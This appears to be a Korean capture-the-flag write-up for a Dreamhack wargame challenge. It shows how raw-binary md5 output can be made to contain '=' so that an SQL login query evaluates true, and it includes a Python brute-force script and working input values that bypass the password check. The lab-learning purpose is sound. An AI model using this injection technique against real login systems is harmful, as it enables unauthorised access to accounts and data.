---
title: (30) Dreamhack  [wargame.kr] md5 password 문제풀이
date: 2024-02-05 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
```
md5('value', true);
```

딸랑 이거 주고 끝입니다. 암튼 `md5`함수는 알겠는데 뒤에 있는 `true`는 뭐하는 거냐? 라고 하실 수 있는데, 원래는 16진수로 줄걸 raw binary로 줍니다. 즉 문자 형태로 준다는 거죠.  

이게 이 문제의 핵심입니다. 이제 문제를 봐 봅시다.
## 문제 풀이
사이트에 들어가면 패스워드 입력창이 하나 보입니다.
![](https://kyuyeop.github.io/assets/img/post/30/1.png)
소스코드는 아래와 같습니다.
```php
<?php
 if (isset($_GET['view-source'])) {
  show_source(__FILE__);
  exit();
 }

 if(isset($_POST['ps'])){
  sleep(1);
  include("./lib.php"); # include for $FLAG, $DB_username, $DB_password.
  $conn = mysqli_connect("localhost", $DB_username, $DB_password, "md5_password");
  /*
  
  create table admin_password(
   password char(64) unique
  );
  
  */

  $ps = mysqli_real_escape_string($conn, $_POST['ps']);
  $row=@mysqli_fetch_array(mysqli_query($conn, "select * from admin_password where password='".md5($ps,true)."'"));
  if(isset($row[0])){
   echo "hello admin!"."<br />";
   echo "FLAG : ".$FLAG;
  }else{
   echo "wrong..";
  }
 }
?>
<style>
 input[type=text] {width:200px;}
</style>
<br />
<br />
<form method="post" action="./index.php">
password : <input type="text" name="ps" /><input type="submit" value="login" />
</form>
<div><a href='?view-source'>get source</a></div>
```
아까 그 `md5`함수가 어디갔나 찾아보면
```php
mysqli_query($conn, "select * from admin_password where password='".md5($ps,true)."'")
```
이 sql 쿼리에 들어 있습니다. post로 받은 값을 해시로 만들어 검색하는 모양이군요.  
  
md5해시는 문제가 좀 있습니다. 해시함수가 너무 간단해서 해시로 만드는데 너무 짧은 시간이 걸립니다. 또한 길이도 길지 않고요.  
그래서 특정 조건을 만족하는 md5해시를 구하는데는 일반적인 컴퓨터로도 몇분 정도면 충분합니다. 물론 원문을 모두 복구할 수 있진 않습니다. 대신 몇글자만 일치하는 해시는 금방 찾습니다.(제 컴퓨터로는 초당 75만개 까지 가능하네요)  
  
우리가 찾아야 하는건 뭘까요?  
저 패스워드 부분이 참이 되도록 하려면 두가지 방법이 있습니다.  

첫번째는 우리가 익히 봐온
```
paswword='~~~' or 참#'
password='~~~' or '참'
```
같은 형태입니다. `or`로 password에 관련없이 참 조건을 만들어내는 겁니다. mysql은 문자열로 들어온 값의 첫 글자가 `1~9`사이 숫자면 참으로, 나머지는 모두 거짓으로 간주합니다.  
다만 `'or참#`을 만족시키는 해쉬를 찾기엔 조건이 너무 깁니다. 아무리 md5라도 조건 5글자나 조건을 거는건 너무 오랜 시간이 걸릴겁니다.  
  
다른 방법은 false injection이라는 겁니다.
```
paswword='~~~'='~~~'
```
저도 이건 모르고 있었는데 md5 해쉬중에 대표적인 녀석인가 보더군요. password='~~~'부분이 거짓일때 그걸 다른 거짓과 비교하는 방식인가 봅니다. 이게 가능하려면 약간의 제약 조건이 있습니다.
```
1.해쉬의 = 앞부분이 비밀번호이면 안됨
2.= 뒷부분이 1~9사이 숫자로 시작하면 안됨
```
그래봐야 위에 있던것과 비교하면 `'='`가 들어있는 것만 찾으면 되므로 더 빠르겠죠.  
  
그럼 어떤 걸 해쉬하면 `'='`이 포함되어 있는지만 알면 되겠군요. 파이썬으로 코드를 짜보겠습니다.
```python
from hashlib import md5

for i in range(10000000):
    hash = md5(str(i).encode()).digest()
    if b"'='" in hash:
        print(i, hash)
```
`0~9999999`까지 숫자를 문자로 바꿔서 `'='`이 들어있는지 검사 했습니다. 몇초 걸리지도 않습니다.  
그 결과는
```
1839431 b"\xc37\x90\xa5\xaf\xc4\xb1A@J\xbe'='\xaa\xa9"
2584670 b"\xdf\x8b\x12'='N/\xe6*{\xec\x18\x16\x931"
2632003 b"\x1c\x12(\xcc'='6\xfaQE\x84\x0e\x96\xed\x99"
2998869 b"\xfe\xb2'=':\xe9T\xea\xd6,p\xa7\x80\xf1\xe1"
4939073 b"u}t'Q'='\x14\xd9\xe2\x8e\xec.\xd8\x8a"
5263117 b"e'='\x80\xb0\xb4\xf6\x12\xd6M@KD\x06\xcb"
5273607 b"\xb7\x94a\x9f\x10d\xbe\xc6\x87\x04\xf4;\xac'='"
5872358 b"\x0eY\xb0T\xb3v\xbc\xe0+\xdd\xc6'='\xf5\xff"
7201387 b"V)'='\x0bf\xd6\x081d\xbd\xfa\x9b+\x16"
8930081 b"<4\nx'='\x81\xda\xbf\x8cg\xbc2\xad\x17"
9235566 b"\xee\x83\xe2'='\xd3\x99\xed0\xda\xe8\xa1\xfe\xfd\xeb"
```
이 중에 `'='`다음이 숫자인 것만 걸러서 쓰면 됩니다. `2632003`을 제외하면 다 가능합니다.  
  
그래서 `1839431`을 넣어보면
![](https://kyuyeop.github.io/assets/img/post/30/2.png)
flag가 나옵니다.  
  
만약 앞서 언급합 `2632003`을 넣어보면
![](https://kyuyeop.github.io/assets/img/post/30/3.png)
이렇게 틀렸다고 나오는걸 볼 수 있습니다.
{% endraw %}